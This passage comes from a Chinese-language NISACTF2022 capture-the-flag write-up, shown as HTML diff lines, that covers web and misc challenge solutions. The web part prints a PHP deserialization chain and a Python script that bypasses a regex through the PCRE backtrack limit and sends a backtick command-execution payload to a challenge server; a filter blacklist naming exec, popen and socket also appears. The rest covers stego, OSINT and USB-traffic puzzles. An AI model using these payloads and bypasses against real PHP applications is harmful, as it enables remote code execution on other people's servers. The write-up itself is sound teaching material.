class="line">$I2 = new Ilovetxw();</span><br><span class="line">$I2-&gt;huang = $f1;</span><br><span class="line">$T1 = new TianXiWei();</span><br><span class="line">$T1-&gt;x = &quot;sixsixsix&quot;;</span><br><span class="line">$T1-&gt;ext = $I2;</span><br><span class="line">echo urlencode(serialize($T1));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里利用GlobIterator类来查找flag所在文件的名字</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203280002454.png" alt="img"></p>
+<p>再利用SplFileObject类配合php伪协议读取其中的内容</p>
+<p>将exp中$N1-&gt;txw4ever 的值修改为 echo new SplFileObject(&quot;php://filter/convert.base64-encode/resource=/fllllllaaag&quot;); 即</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$N1-&gt;txw4ever = &quot;echo new SplFileObject(\&quot;php://filter/convert.base64-encode/resource=/fllllllaaag\&quot;);&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>即可得到flag内容</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203280003162.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203280003652.png" alt="img"></p>
+<p>ps1：除了GlobIterator类，还有FilesystemIterator和DirectoryIterator类也可以查找文件名，用法为DirectoryIterator(glob:///f*)，但是为了让大家知道GlobIterator类自带了glob协议查找，所以waf中过滤了glob</p>
+<p>ps2：SplFileObject可直接配合文件名读取，wp中写伪协议也是想让大家知道这个类可以配合伪协议用</p>
+<h3 id="middlerce"><a href="#middlerce" class="headerlink" title="middlerce"></a>middlerce</h3><p>题目源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;check.php&quot;;</span><br><span class="line">if (isset($_REQUEST[&#x27;letter&#x27;]))&#123;</span><br><span class="line">    $txw4ever = $_REQUEST[&#x27;letter&#x27;];</span><br><span class="line">    if (preg_match(&#x27;/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m&#x27;,$txw4ever))&#123;</span><br><span class="line">        die(&quot;再加把油喔&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $command = json_decode($txw4ever,true)[&#x27;cmd&#x27;];</span><br><span class="line">        checkdata($command);</span><br><span class="line">        @eval($command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这题在preg_match中加了很多过滤，预期就是想让大家不靠常规的payload来绕过（不知道有没有拦住大家），那这题需要利用到PCRE回溯次数限制（老考点了），P神博客有写<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">–&gt;戳&lt;–</a></p>
+<p>绕过preg_match后，还有对command的过滤，这里也直接放源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/\^|\||\~|assert|print|include|require|\(|echo|flag|data|php|glob|sys|phpinfo|POST|GET|REQUEST|exec|pcntl|popen|proc|socket|link|passthru|file|posix|ftp|\_|disk|tcp|cat|tac/i</span><br></pre></td></tr></table></figure>
+
+<p>过滤了无字母数字，无参数RCE以及绕过disable_function的一些操作，同时也防了一手写马操作</p>
+<p>这里放出了反引号，说到反引号很快就想到了echo  <code>ls</code>这种命令执行，但是echo被ban了，但这里又放出了php短标签，所以构造出cmd命令为?&gt;<?= `ls\`?>即可完成RCE</p>
+<p>flag在/flag，利用大量脏数据触发PCRE的回溯上限，再RCE</p>
+<p>exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload = &#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `tail /f*`?&gt;&quot;,&quot;$&quot;:&quot;&#x27; + &quot;$&quot;*(1000000) + &#x27;&quot;&#125;&#x27;</span><br><span class="line"></span><br><span class="line">res = requests.post(&quot;http://1.14.71.254:28044/&quot;, data=&#123;&quot;letter&quot;:payload&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>扫描二维码回复关键字NISACTF2022即可</p>
+<h3 id="huaji？"><a href="#huaji？" class="headerlink" title="huaji？"></a>huaji？</h3><p>1.先将图片用winhex打开，拉到底部发现PK 和 flag.txt</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/image-20220328003151907.png" alt="image-20220328003151907"></p>
+<p>2.用 foremost进行分离，得到（这里由于隐写方法的原因，可以直接将下载的附件修改后缀为zip，同样可以得到压缩包而无需使用foremost）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/xvkBwlt2MzXwzZpj.png!thumbnail" alt="img"></p>
+<p>发现压缩包需要密码，继续查找信息，在属性的详细信息发现一串字符</p>
+<p>6374665f4e4953415f32303232</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/iw9mhLZkRWdTtOuG.png!thumbnail" alt="img"></p>
+<p>猜测为16进制，进行转换得到</p>
+<p>ctf_NISA_2022 </p>
+<p>打开压缩包，得到flag为flag{Nls@_FumYEnnOjy}</p>
+<h3 id="bqt"><a href="#bqt" class="headerlink" title="bqt"></a>bqt</h3><p>打开pdf，猜测flag值在图片底下，wps将pdf转为word格式后，将图片移走发现一串字符</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/zVfzwoWxyNhQCsUf.png!thumbnail" alt="img"></p>
+<p>c8e9aca0c3f4e6e5f2a1a0d4e8e5a0e6ece1e7a0e9f3baa0e6ece1e7fbf7e5e6e5efe9e4eae7efe5e4f3e6e9eff2f0e5e6e4e6e7e7e6e4f3e5fd</p>
+<p>发现这其中的字符串由0-9、a-f组成，我们知道2位十六进制可表示1个字节，写脚本将该字符串两两分组转换成字节，发现所有字节均大于128，我们又知道ASCII码表示范围是0-127，于是每一个字节都减去128，再转换成字符串，得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/xRLkqdyAAW98wDEU.png!thumbnail" alt="img"></p>
+<p>Hi, Ctfer! The flag is: flag{wefeoidjgoedsfiorpefdfggfdse}</p>
+<h3 id="where-is-here"><a href="#where-is-here" class="headerlink" title="where_is_here"></a>where_is_here</h3><p>既然给了图片，那看一下图片要素有哪些，一看就是一个宾馆的户型，最显眼的就是床头的画像</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/y2SVP8pQNl4LXFuE.png!thumbnail" alt="img"></p>
+<p>记住这些要素后，就要用到一个神器（这里百度识图即可），直接识图得<img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/0IZBNWKAfaYTrVHD.png!thumbnail" alt="img"></p>
+<p>图像暴露了一切，可以看到左右两张一摸一样，点进去可以直接看到图片来源，接下来就收集我们需要的信息即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/Zln1H3ENHH864Jqy.png!thumbnail" alt="img"></p>
+<p>既然涉及到地址，那就直接上百度地图查看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/hp10yf5855Ovwr9v.png!thumbnail" alt="img"></p>
+<p>这样地址我们就get到了，但是这里显示的是座机号不符合题目描述的格式，那我们点进去查看（这里其实没有符合题目描述的手机号）因此需要从其他地方找，既然是景区旅店，那可以在携程上找</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/OtBplkL04j90ZSOh.png!thumbnail" alt="img"></p>
+<p>符合格式的手机号get，则flag为NSSCTF{厦门市思明区鼓浪屿康泰路25号17746048875}</p>
+<h3 id="不愉快的地方"><a href="#不愉快的地方" class="headerlink" title="不愉快的地方"></a>不愉快的地方</h3><p>又是一张图，看不出什么有用的信息，记住大体的地形地势，我们去识图试试</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/91SDVyaU8uFZU5P2.png!thumbnail" alt="img"></p>
+<p>这些图都很像，那我们一个一个看（很多会指向苏州和广州，但显然他们都不是），点进左边第一张</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/NWWsYgjpKWU2Kv60.png!thumbnail" alt="img"></p>
+<p>图片来源有四个，我们同样排查（其实很清晰的可以看到右上最符合）所以是在韩国清溪川</p>
+<p>上地图查经纬度（这里我用Google地图，这里查官网需要科学上网）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/nHSxVhAAH0O7rJ0Q.png!thumbnail" alt="img"></p>
+<p>可以从地图上找到经纬度（这里Google地图直接显示纬度在前，由于各种软件的问题会导致经纬度有略微的偏差，以google地图为准）这里题目描述不太清楚，没有明确说明无需四舍五入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/8bhcp50vD37KIiHy.png!thumbnail" alt="img"></p>
+<p>负责人的话，我们直接去官网看（原谅我得翻译成中文）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/KV5fUz9H08if1kFK.png!thumbnail" alt="img"></p>
+<p>在公司组织架构中，我们可以找到运营团队的负责人的信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/CnwRDiUQ3JO1i5X0.png!thumbnail" alt="img"></p>
+<p>所有信息都有了，flag为NSSCTF{清溪川_37.56,126.97_金贤民_6801}</p>
+<h3 id="破损的flag"><a href="#破损的flag" class="headerlink" title="破损的flag"></a>破损的flag</h3><p>题目拿到手，直接表明是一个usb流量，根据其特征码在第三位显示信息，可以知道是属于键盘流量</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/FioMSwsbRRwAGBXE.png!thumbnail" alt="img"></p>
+<p>我们使用wireshark自带的tshark提取数据</p>
+<p><code>tshark -r usb.pcap -T fields -e usb.capdata | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt #提取并去除空行</code></p>
+<p>这里使用脚本加上双引号，新版的wireshark需要各位师傅自行调整格式</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/GnFH61QhE45XVzXx.png!thumbnail" alt="img"></p>
+<p>这里根据《USB协议键盘中键码》中的HID Usage ID将数据成键位，也可以写一个py脚本快速转换</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/uKs2qOSsfcAuBKvu.png!thumbnail" alt="img"></p>
+<p>贴上exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">normalKeys = &#123;&quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;,&quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#x27;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;,&quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;</span><br><span class="line">shiftKeys = &#123;&quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;&#123;&quot;,&quot;30&quot;:&quot;&#125;&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\&quot;&quot;,&quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = open(&#x27;usbdata.txt&#x27;)</span><br><span class="line">for line in keys:</span><br><span class="line">    try:</span><br><span class="line">        if line[0]!=&#x27;0&#x27; or (line[1]!=&#x27;0&#x27; and line[1]!=&#x27;2&#x27;) or line[3]!=&#x27;0&#x27; or line[4]!=&#x27;0&#x27; or line[9]!=&#x27;0&#x27; or line[10]!=&#x27;0&#x27; or line[12]!=&#x27;0&#x27; or line[13]!=&#x27;0&#x27; or line[15]!=&#x27;0&#x27; or line[16]!=&#x27;0&#x27; or line[18]!=&#x27;0&#x27; or line[19]!=&#x27;0&#x27; or line[21]!=&#x27;0&#x27; or line[22]!=&#x27;0&#x27; or line[6:8]==&quot;00&quot;:</span><br><span class="line">             continue</span><br><span class="line">        if line[6:8] in normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==&#x27;2&#x27;]</span><br><span class="line">        else:</span><br><span class="line">            output += [&#x27;[unknown]&#x27;]</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=0</span><br><span class="line">print(&quot;&quot;.join(output))</span><br><span class="line">for i in range(len(output)):</span><br><span class="line">    try:</span><br><span class="line">        a=output.index(&#x27;&lt;DEL&gt;&#x27;)</span><br><span class="line">        del output[a]</span><br><span class="line">        del output[a-1]</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">for i in range(len(output)):</span><br><span class="line">    try:</span><br><span class="line">        if output[i]==&quot;&lt;CAP&gt;&quot;:</span><br><span class="line">            flag+=1</span><br><span class="line">            output.pop(i)</span><br><span class="line">            if flag==2:</span><br><span class="line">                flag=0</span><br><span class="line">        if flag!=0:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">print (&#x27;output :&#x27; + &quot;&quot;.join(output))</span><br></pre></td></tr></table></figure>
+
+<p>解出来是一个键盘密码，自行圈起来（需要自行分离一下）</p>
+<p>ujko  njk,  tfvbh  yhji  pok  rdcvg  rdcvg  pok  qwsz  tfvbh  ujko  wazxd  qase  wsdr  pokx  dfv  iklp  njk  wsdr  rfgy  rdcvg  uhnmk  bhjm  yhji</p>
+<p>i m g u l f f l a g i s w e l c o m e t f j n u分一下：</p>
+<p>im gulf flag is welcome t fjnu</p>
+<p>flag有破损，依据题目描述t要自行补全为to，flag为NSSCTF{welcome_to _fjnu}</p>
+<h3 id="神秘数字"><a href="#神秘数字" class="headerlink" title="神秘数字"></a>神秘数字</h3><p>第一串字符是五笔：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/E2q2Myz3L6Bqlu9V.png!thumbnail" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/image-20220328003056695.png" alt="image-20220328003056695"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/image-20220328003321421.png" alt="image-20220328003321421"></p>
+<p>第二串字符是中文电码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/JzBF442Y4dlTirpc.png!thumbnail" alt="img"></p>
+<p>第三串字符是郑码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/ysVFOJdGIsFYYUny.png!thumbnail" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/eqD1XRdNSbTISKjY.png!thumbnail" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/5nSt7FIXnfqr8nj8.png!thumbnail" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/zstE443iRUxo6Ki1.png!thumbnail" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/A6lo2yTGUhK6WjCF.png!thumbnail" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/qiJY16ONaoc4WSXT.png!thumbnail" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/TbGzmvrc8bU7kZz1.png!thumbnail" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/UL8fp1mZv4K7Y0Z3.png!thumbnail" alt="img"></p>
+<p>第四串字符是四角号码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/R6Lg8B2bw6N8RqhY.png!thumbnail" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/78fPMnY0EKsKUd2R.png!thumbnail" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/rKBjUqQ6WYUKYNbI.png!thumbnail" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/Fo7dj88NX9pJg60w.png!thumbnail" alt="img"></p>
+<p>第五串字符是仓颉编码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/knwfwRCBGptXN1la.png!thumbnail" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/vDJEpld2AZXipuNY.png!thumbnail" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/zU2JIg5fnUjce6GS.png!thumbnail" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/5ZOPsdVyirssKlvK.png!thumbnail" alt="img"></p>
+<p>将上述文字拿去md5加密：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/q8LX4HbDfKoQZC94.png!thumbnail" alt="img"></p>
+<p>这里采用的是MD5的86版，换成大写套上前缀得到flag为NSSCTF{BE29981639FCE3A4B719E4347FED9E43}</p>
+<h3 id="我怎么什么都看不见"><a href="#我怎么什么都看不见" class="headerlink" title="我怎么什么都看不见"></a>我怎么什么都看不见</h3><p>binwalk-e可以分离出隐藏文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/Zl161SuDZyMAfWt5.png!thumbnail" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/pKZ6z6WrhD5fYGE8.png!thumbnail" alt="img"></p>
+<p>file文件识别，补充文件头，可以得到目的文件：</p>
+<p>NISA.jpg</p>
+<p>stegsolove跑一跑：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/ThbAfz4BuV2a4sMy.png!thumbnail" alt="img"></p>
+<p>NISA{Wlec0me_to_NiSa2022}</p>
+<h3 id="bilala的二维码"><a href="#bilala的二维码" class="headerlink" title="bilala的二维码"></a>bilala的二维码</h3><p>打开附件发现二维码图片缺少定位码，补充定位码如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/ESw9N7GXJvWodA8n.png!thumbnail" alt="img"></p>
+<p>扫描二维码得到皮卡丘图片，保存</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/LHWK8x4SNXFjPX4K.png!thumbnail" alt="img"></p>
+<p>foremost一下得到一个jpg图片和一个压缩包，（该题无法使用binwalk）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/IrF7CxkNJibAD8L9.png!thumbnail" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/yh2S8a0OWpCcp2FR.png!thumbnail" alt="img"></p>
+<p>压缩包使用ARCHPR爆破，密码为NiSA</p>
+<p>压缩包打开得到一个mp3文件，直接使用工具可以听到哒哒哒的摩斯音，放到音轨中，打出摩斯码，在线解密得到第一部分：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/oc2NbVLhHPP6dbTw.png!thumbnail" alt="img"></p>
+<p>第二部分flag依据题目描述直接上分辨率</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/ct2Ln4InqLImYkxV.png!thumbnail" alt="img"></p>
+<p>合起来就是最后的flag：</p>
+<p>M0RS34NDN282X231</p>
+<p> flag为NSSCTF{M0RS34NDN282X231}</p>
+<h3 id="流量包里有个熊"><a href="#流量包里有个熊" class="headerlink" title="流量包里有个熊"></a>流量包里有个熊</h3><p>打开pcapng文件，过滤http包，导出特定分组：<img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/3UHwWv3kKSNlbK9J.png!thumbnail" alt="img">binwalk -e 后打开最深层的flag.txt文件，发现数据：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/Ijt46hnLXjkI5f1x.png!thumbnail" alt="img"></p>
+<p>后续步骤为，ROT13后winhex保存为png文件，<img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/MHdqOvgsK9moVpx8.png!thumbnail" alt="img"></p>
+<p>该图片拿去盲水印解密即可。（隐形水印工具）</p>
+<p>（这一步骤可以多调几次参数对比看，大概数据为33、47，整个flag会比较明显)也可以截图放到编辑工具中进行颜色反转</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/PmryfYLHdJzVddeU.png!thumbnail" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/fwbtBe11npea5tpf.png!thumbnail" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/Ax9C2DI0eD0WQTng.png!thumbnail" alt="img"></p>
+<p>NISA{S0_clev2l_You}</p>
+<h3 id="bmpnumber"><a href="#bmpnumber" class="headerlink" title="bmpnumber"></a>bmpnumber</h3><p>利用wb4stego对bmp文件进行解密得到图片<img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/UbqdvhUEXAIgBsWO.png!thumbnail" alt="img"> 这里有个小坑，解密是不需要密码的，空密码直接可以得出图片：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/G2VpDbbbtYVzWYBu.png!thumbnail" alt="img"></p>
+<p>对二维码进行去马赛克处理或者直接ps覆盖新的定位符即可，马赛克只覆盖在定位符上</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/EkqIF33pSNsq7GRl.png!thumbnail" alt="img"></p>
+<p>扫描发现需要密码，提示weak，弱密码，输入password得到word文件，里面有一行密码，但是没什么用，全选，发现下面还有一行，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/x13y8o4PR3MnSSRo.png!thumbnail" alt="img">修改字体颜色，得到flag<img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/4vLIjOYVklIAaHw0.png!thumbnail" alt="img"></p>
+<h3 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h3><p>题目给出一个raw文件，使用volatility查看Imageinfo<img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/VIyLKT3YkaWhihq4.png!thumbnail" alt="img"></p>
